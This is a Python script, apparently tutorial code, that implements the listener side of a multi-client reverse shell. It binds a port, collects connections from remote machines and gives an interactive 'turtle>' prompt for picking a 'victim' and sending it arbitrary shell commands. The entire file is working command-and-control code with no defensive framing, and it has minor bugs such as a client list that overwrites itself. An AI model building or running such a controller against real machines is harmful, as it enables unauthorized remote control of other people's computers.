import socket
import threading
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
connections = []
addresses = []


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when Server.py file is restarted

def accepting_connections():
    for c in connections:
        c.close()

    del connections[:]
    del addresses[:]

    while True:
        try:
            s.setblocking(True)  # prevents timeout
            conn, address = s.accept()

            connections.append(conn)
            addresses.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del connections[i]
            del addresses[i]
            continue

        results = str(i) + "   " + str(addresses[i][0]) + "   " + str(addresses[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = connections[target]
        print("You are now connected to :" + str(addresses[target][0]))
        print(str(addresses[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        threading.Thread(target=work, daemon=True).start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
